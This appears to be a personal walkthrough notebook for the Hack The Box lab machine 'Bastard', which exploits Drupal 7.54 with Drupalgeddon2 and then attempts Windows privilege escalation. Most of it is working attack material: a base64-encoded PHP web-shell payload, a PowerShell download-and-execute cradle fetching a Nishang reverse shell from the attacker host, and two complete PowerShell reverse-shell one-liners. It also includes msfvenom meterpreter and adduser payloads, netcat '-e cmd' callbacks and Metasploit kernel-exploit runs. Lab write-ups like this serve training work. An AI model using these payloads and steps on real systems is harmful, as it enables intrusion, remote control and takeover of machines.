# bastard 10.10.10.9



- Windows Server 2008 R2 Datacenter 
- 6.1.7600 N/A Build 7600
- No hot fix


- Drupal 7.54
   => CVE-2018-7600 : Drupalgeddon2 or Drupalgeddon3
- Powershell Invoke-PowerShellTcp.ps1


## Nmap
````
$ nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.9
$ nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.9 
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

$ nmap -sV -sC -p 80,135,49154 -oA scans/scripts 10.10.10.9
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
http-robots.txt
````

## Robots.txt

````
$ curl -s http://10.10.10.9/robots.txt
$ curl -s http://10.10.10.9/CHANGELOG.txt | head
Drupal 7.54, 2017-02-01
````

Note:
IIS 7.5 => IIS for Windows 7 / Server 2008r2. 


## DRUPAL scanner => droopescan

```
$ /opt/droopescan/droopescan scan drupal -u http://10.10.10.9
```

## Drupalgeddon2
Exploit for Drupal 7.54
 - Drupal 7.x Module Services - Remote Code Execution
    -  https://www.ambionics.io/blog/drupal-services-module-rce
    - exploit_drupal_7_54.php
 - Drupalgeddon2 (March 2018)
    - https://github.com/dreadlocked/Drupalgeddon2
    - drupalgeddon2.rb

 - Drupalgeddon3 (April 2018) 


drupalgeddon2
```
# ./drupalgeddon2.rb  http://10.10.10.9/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo HHRJHXQA
[+] Result : HHRJHXQA
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.9/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands

drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>> dir
Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of C:\inetpub\drupal-7.54

19/03/2017  09:04 ��    <DIR>          .
19/03/2017  09:04 ��    <DIR>          ..
19/03/2017  01:42 ��               317 .editorconfig
19/03/2017  01:42 ��               174 .gitignore
19/03/2017  01:42 ��             5.969 .htaccess
19/03/2017  01:42 ��             6.604 authorize.php
19/03/2017  01:42 ��           110.781 CHANGELOG.txt

type  \users\dimitris\Desktop\user.txt
XXXXXXXXXXXXXXXXXXXXXXX
```
## We are in a 32bit cmd.exe
```
WMIC OS get osarchitecture
OSArchitecture  
64-bit          

drupalgeddon2>> echo %PROCESSOR_ARCHITEW6432%
AMD64  => 32 bit
drupalgeddon2>> C:\Windows\sysnative\cmd.exe
No response, loose stdin...
```

## Try with another exploit

```
https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py
```

```
# ./drupalgedon2.py -h http://10.10.10.9/ -c 'whoami'
nt authority\iusr

root@kali:~/htb/YoloToolbox/machines/htb/bastard# ./drupalgedon2.py -h http://10.10.10.9 -c 'ls -la /'

root@kali:~/htb/YoloToolbox/machines/htb/bastard# ./drupalgedon2.py -h http://10.10.10.9 -c 'WMIC OS get osarchitecture'
OSArchitecture  
64-bit          


root@kali:~/htb/YoloToolbox/machines/htb/bastard# ./drupalgedon2.py -h http://10.10.10.9 -c 'echo %PROCESSOR_ARCHITEW6432%'
AMD64

```

## Another User shell with Nishang

Nishang Powershell - Invoke-PowerShellTcp.ps1
- https://github.com/samratashok/nishang
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Update the last line with IP/port
```
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.32 -Port 4443
```

Setup a server
```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.9 - - [29/Aug/2019 23:08:42] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Use Drupalgedon2.py to run a command:
```
./drupalgedon2.py -h http://10.10.10.9 -c "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.32:8000/Invoke-PowerShellTcp.ps1')"
```

nc
```
# nc -lvp 4443
listening on [any] 4443 ...
10.10.10.9: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.9] 49335
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>whoami
nt authority\iusr
```
We are in a powershell shell



## Nishang one liner : à tester
```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```


## Elevation

### Get OS version
```
C:\inetpub\drupal-7.54> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600

6.1 	=> 	Windows 7 / Windows Server 2008 R2



OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          29/8/2019, 8:18:35 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.048 MB
Available Physical Memory: 1.502 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.514 MB
Virtual Memory: In Use:    581 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
PS C:\inetpub\drupal-7.54> 
```

### Get kernel exploit



Windows Hacking Pack : https://github.com/51x/WHP
 - Set of tool for exploitation

Watson : Analyse and suggest exploits for windows
  - https://github.com/rasta-mouse/Watson
  - use of Watson in HTB:Devel box : https://0xdf.gitlab.io/2019/03/05/htb-devel.html#privesc-web--system



Get .Net version
```
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
```

Precompiled Windows kernel exploits: 
- https://github.com/abatchy17/WindowsExploits
- https://github.com/AusJock/Privilege-Escalation/tree/master/Windows

MS11-046 : spawn a system shell in remote shell

Be root: https://github.com/AlessandroZ/BeRoot

## MSF exploit suggester
```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1

msf5 post(multi/recon/local_exploit_suggester) > options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > run
```

=> use exploit/windows/local/ms10_015_kitrap0d

=> use exploit/windows/local/ms15_051_client_copy_image 

## Use AlwaysInstallElevated ?
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Build a payload that create a new user
```
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
```

Install
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

List the admins
```
net localgroup Administrators
```


## Use Unattended install

cf: https://toshellandback.com/2015/11/24/ms-priv-esc/



## Upload Taihou64.exe

```
Invoke-WebRequest http://10.10.14.32:8000/Taihou64.exe -OutFile Taihou64.exe   : not working

(new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:8000/Taihou64.exe', 'Taihou64.exe')   : ok
dir
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:8000/Taihou32.exe', 'Taihou32.exe') 
```

On lance les 2, rien ne se passe.


wget https://github.com/amonsec/exploit/raw/master/windows/privs/MS10-015-KiTrap0D/vdmallowed.exe
wget https://github.com/amonsec/exploit/raw/master/windows/privs/MS10-015-KiTrap0D/vdmexploit.dll

(new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:8000/vdmallowed.exe', 'vdmallowed.exe') 
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:8000/vdmexploit.dll', 'vdmexploit.dll') 


Not working....


## Metasploit 

### Build reverse shell

Build a reverse shell
```
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=4445 -f exe > msf_shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```


Upload it & run it
```
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:8000/msf_shell.exe', 'msf_shell.exe') 
```

### Handler
Before upload prepare msf handler
```
# msfconsole

msf > use exploit/multi/handler 

msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf exploit(multi/handler) > set LHOST 10.10.14.32
LHOST => 10.10.14.32
msf exploit(multi/handler) > set LPORT 4445
LPORT => 4445
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.32:4445 
[*] Sending stage (206403 bytes) to 10.10.10.9
[*] Meterpreter session 1 opened (10.10.14.32:4445 -> 10.10.10.9:49439) at 2019-09-07 16:07:15 +0200

meterpreter > background
[*] Backgrounding session 1...
```
### Exloit suggester

```
msf exploit(windows/local/ms10_015_kitrap0d) > sessions 1
[*] Starting interaction with 1...

meterpreter > run post/multi/recon/local_exploit_suggester 
Display all 281 possibilities? (y or n)
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.10.10.9 - Collecting local exploits for x64/windows...
[*] 10.10.10.9 - 18 exploit checks are being tried...
[+] 10.10.10.9 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
meterpreter > 
```

### Try exploit/windows/local/ms10_092_schelevator .. Fail



### Try exploit/windows/local/ms15_051_client_copy_image .. Fail

```
msf exploit(multi/handler) > use exploit/windows/local/ms15_051_client_copy_image 
msf exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(windows/local/ms15_051_client_copy_image) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64

msf exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1

msf exploit(windows/local/ms15_051_client_copy_image) > set target 1
target => 1
msf exploit(windows/local/ms15_051_client_copy_image) > set LHOST 10.10.14.32
LHOST => 10.10.14.32

msf exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.32:4444 
[*] Launching notepad to host the exploit...
[+] Process 592 launched.
[*] Reflectively injecting the exploit DLL into 592...
[*] Injecting exploit into 592...
[*] Exploit injected. Injecting payload into 592...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.

```

### Upload NC64.exe, get a 64bit shell. then run msf_shell.exe

https://github.com/phackt/pentest/tree/master/privesc/windows
https://github.com/phackt/pentest/raw/master/privesc/windows/nc64.exe

(new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:8000/nc64.exe', 'nc64.exe') 

PS C:\inetpub\drupal-7.54> .\nc64.exe 10.10.14.32 4447 -e cmd

Got a 64 bit cmd
```
# nc -lvp 4447
listening on [any] 4447 ...
10.10.10.9: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.9] 49472
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of C:\inetpub\drupal-7.54

07/09/2019  05:33 ��    <DIR>          .
07/09/2019  05:33 ��    <DIR>          ..
19/03/2017  01:42 ��               317 .editorconfig
19/03/2017  01:42 ��               174 .gitignore
19/03/2017  01:42 ��             5.969 .htaccess
19/03/2017  01:42 ��             6.604 authorize.php
07/09/2019  02:37 ��                12 bob.txt
19/03/2017  01:42 ��           110.781 CHANGELOG.txt
19/03/2017  01:42 ��             1.481 COPYRIGHT.txt
19/03/2017  01:42 ��               720 cron.php
19/03/2017  01:43 ��    <DIR>          includes
19/03/2017  01:42 ��               529 index.php
19/03/2017  01:42 ��             1.717 INSTALL.mysql.txt
19/03/2017  01:42 ��             1.874 INSTALL.pgsql.txt
19/03/2017  01:42 ��               703 install.php
19/03/2017  01:42 ��             1.298 INSTALL.sqlite.txt
19/03/2017  01:42 ��            17.995 INSTALL.txt
19/03/2017  01:42 ��            18.092 LICENSE.txt
19/03/2017  01:42 ��             8.710 MAINTAINERS.txt
19/03/2017  01:43 ��    <DIR>          misc
19/03/2017  01:43 ��    <DIR>          modules
07/09/2019  04:47 ��             7.168 msf_shell.exe
07/09/2019  05:33 ��            45.272 nc64.exe
19/03/2017  01:43 ��    <DIR>          profiles
19/03/2017  01:42 ��             5.382 README.txt
19/03/2017  01:42 ��             2.189 robots.txt
19/03/2017  01:43 ��    <DIR>          scripts
19/03/2017  01:43 ��    <DIR>          sites
07/09/2019  02:57 ��             5.632 Taihou32.exe
07/09/2019  03:00 ��             6.144 Taihou64.exe
19/03/2017  01:43 ��    <DIR>          themes
19/03/2017  01:42 ��            19.986 update.php
19/03/2017  01:42 ��            10.123 UPGRADE.txt
07/09/2019  04:00 ��            73.216 vdmallowed.exe
07/09/2019  04:01 ��            43.008 vdmexploit.dll
19/03/2017  01:42 ��             2.200 web.config
19/03/2017  01:42 ��               417 xmlrpc.php
              28 File(s)        397.713 bytes
               9 Dir(s)  30.803.402.752 bytes free

C:\inetpub\drupal-7.54>

C:\inetpub\drupal-7.54>

C:\inetpub\drupal-7.54>echo %PROCESSOR_ARCHITEW6432%
echo %PROCESSOR_ARCHITEW6432%
%PROCESSOR_ARCHITEW6432%

C:\inetpub\drupal-7.54>env
env
'env' is not recognized as an internal or external command,
operable program or batch file.

C:\inetpub\drupal-7.54>

C:\inetpub\drupal-7.54>

C:\inetpub\drupal-7.54>env
env
'env' is not recognized as an internal or external command,
operable program or batch file.

C:\inetpub\drupal-7.54>set
set
PROMPT=$P$G
_FCGI_X_PIPE_=\\.\pipe\IISFCGI-3cb1b483-f9e2-4897-8037-e8dba6848d01
PHP_FCGI_MAX_REQUESTS=10000
PHPRC=C:\Program Files (x86)\PHP\v5.3
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Windows\system32\config\systemprofile\AppData\Roaming
APP_POOL_CONFIG=C:\inetpub\temp\apppools\Drupal.config
APP_POOL_ID=Drupal
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=BASTARD
ComSpec=C:\Windows\system32\cmd.exe
FP_NO_HOST_CHECK=NO
LOCALAPPDATA=C:\Windows\system32\config\systemprofile\AppData\Local
NUMBER_OF_PROCESSORS=2
OLAP_HOME=C:\oracle\ora90\olap
OS=Windows_NT
Path=C:\Program Files (x86)\PHP\v5.6;C:\Program Files (x86)\Internet Explorer;;C:\oracle\ora90\bin;C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86;C:\Program Files (x86)\Oracle\jre\1.1.8\bin;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\MySQL\MySQL Server 5.5\bin;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=0102
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PSModulePath=WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Windows\TEMP
TMP=C:\Windows\TEMP
USERDOMAIN=HTB
USERNAME=BASTARD$
USERPROFILE=C:\Windows\system32\config\systemprofile
windir=C:\Windows

C:\inetpub\drupal-7.54>


```
PROCESSOR_ARCHITECTURE=AMD64
Still in 32bit shell ????
